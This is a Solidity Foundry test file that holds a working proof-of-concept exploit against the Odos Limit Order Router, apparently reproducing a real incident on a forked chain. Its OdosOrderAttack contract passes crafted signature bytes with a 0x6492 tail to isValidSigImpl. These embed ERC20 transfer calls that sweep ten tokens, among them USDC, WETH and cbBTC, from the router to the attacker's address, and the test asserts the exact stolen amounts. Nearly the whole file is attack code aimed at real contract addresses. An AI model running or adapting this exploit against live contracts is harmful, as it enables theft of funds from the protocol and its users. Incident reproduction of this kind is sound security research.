
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 25431000;
    uint256 constant TX_TIMESTAMP = 1737651349;
    uint256 constant TX_BLOCK_NUMBER = 25431001;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OdosOrderAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OdosOrderAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = OdosOrderAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OdosOrderAttack();
        }
    }

    function _prepareProfit(OdosOrderAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _etchRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OdosOrderAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(
            Addresses.attacker_eoa, address(0), Addresses.VIRTUAL, "VIRTUAL", 1514424244715040557606
        );
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.cbETH, "cbETH", 144206352825325002);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.WETH, "WETH", 2261323351186171128);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.EURC, "EURC", 198830527);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDC, "USDC", 15578334373);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.AERO, "AERO", 2134216454655905106108);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.FAI, "FAI", 81182355184994926311507);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.wstETH_E452, "wstETH", 122592242770994685);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.cbBTC, "cbBTC", 2343323);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.LBTC_11C1, "LBTC", 576319);
    }
}

contract OdosOrderAttack {
    bytes32 private constant EMPTY_HASH = bytes32(0);
    bytes private constant ODOS_SIG_TAIL = hex"6492649264926492649264926492649264926492649264926492649264926492";

    struct SweepLeg {
        address token;
        uint256 amount;
    }

    function attack() external payable {
        _executeOdosSweep();
    }

    function _executeOdosSweep() internal {
        SweepLeg[10] memory legs = _sweepLegs();
        for (uint256 i = 0; i < legs.length; i++) {
            IERC20Like(legs[i].token).balanceOf(Addresses.OdosLimitOrderRouter);
            _validateTransfer(legs[i]);
        }
    }

    function _sweepLegs() internal pure returns (SweepLeg[10] memory legs) {
        legs[0] = SweepLeg({token: Addresses.USDC, amount: 15578334373});
        legs[1] = SweepLeg({token: Addresses.WETH, amount: 2261323351186171128});
        legs[2] = SweepLeg({token: Addresses.FAI, amount: 81182355184994926311507});
        legs[3] = SweepLeg({token: Addresses.VIRTUAL, amount: 1514424244715040557606});
        legs[4] = SweepLeg({token: Addresses.cbBTC, amount: 2343323});
        legs[5] = SweepLeg({token: Addresses.AERO, amount: 2134216454655905106108});
        legs[6] = SweepLeg({token: Addresses.LBTC_11C1, amount: 576319});
        legs[7] = SweepLeg({token: Addresses.cbETH, amount: 144206352825325002});
        legs[8] = SweepLeg({token: Addresses.wstETH_E452, amount: 122592242770994685});
        legs[9] = SweepLeg({token: Addresses.EURC, amount: 198830527});
    }

    function _validateTransfer(SweepLeg memory leg) internal {
        IOdosLimitOrderRouter(Addresses.OdosLimitOrderRouter)
            .isValidSigImpl(Addresses.A_000000_0004, EMPTY_HASH, _odosSignature(leg), true);
    }

    function _odosSignature(SweepLeg memory leg) internal pure returns (bytes memory) {
        return abi.encodePacked(
            abi.encode(
                leg.token,
                abi.encodeWithSelector(IERC20Like.transfer.selector, Addresses.attacker_eoa, leg.amount),
                hex"ff"
            ),
            ODOS_SIG_TAIL
        );
    }

    receive() external payable {}

    function exploit(address router, address[] calldata tokens) external payable {
        router;
        tokens;
        _executeOdosSweep();
        return;
    }

    fallback() external payable {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_0004 = 0x0000000000000000000000000000000000000004;
    address internal constant UpgradeableOptimismMintableERC20 = 0x07a71B9B835c9ebA242836704d17DA0953324E1F;
    address internal constant VIRTUAL = 0x0b3e328455c4059EEb9e3f84b5543F74E24e7E1b;
    address internal constant attack_contract = 0x22A7dA241A39F189a8Aec269A6F11A238B6086fc;
    address internal constant cbETH = 0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22;
    address internal constant FiatTokenV2_2 = 0x2Ce6311ddAE708829bc0784C967b7d77D19FD779;
    address internal constant attacker_eoa = 0x4015D786e33c1842c3e4d27792098e4A3612Fc0e;
    address internal constant WETH = 0x4200000000000000000000000000000000000006;
    address internal constant EURC = 0x60a3E35Cc302bFA44Cb288Bc5a4F316Fdb1adb42;
    address internal constant wstETH = 0x69ce2505CE515C0203160450157366F927243309;
    address internal constant FiatTokenV2_1 = 0x7458bfDC30034EB860B265E6068121D18Fa5Aa72;
    address internal constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address internal constant AERO = 0x940181a94A35A4569E4529A3CDfB74e38FD98631;
    address internal constant LBTC = 0xA33dD02dB71248e383A615C9A11410Cf049aE99B;
    address internal constant FAI = 0xb33Ff54b9F7242EF1593d2C9Bcd8f9df46c77935;
    address internal constant OdosLimitOrderRouter = 0xB6333E994Fd02a9255E794C177EfBDEB1FE779C7;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant wstETH_E452 = 0xc1CBa3fCea344f92D9239c08C0568f6F2F0ee452;
    address internal constant cbBTC = 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf;
    address internal constant LBTC_11C1 = 0xecAc9C5F704e954931349Da37F60E39f515c11c1;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IOdosLimitOrderRouter {
    function isValidSigImpl(address, bytes32, bytes calldata, bool) external returns (uint256);
}
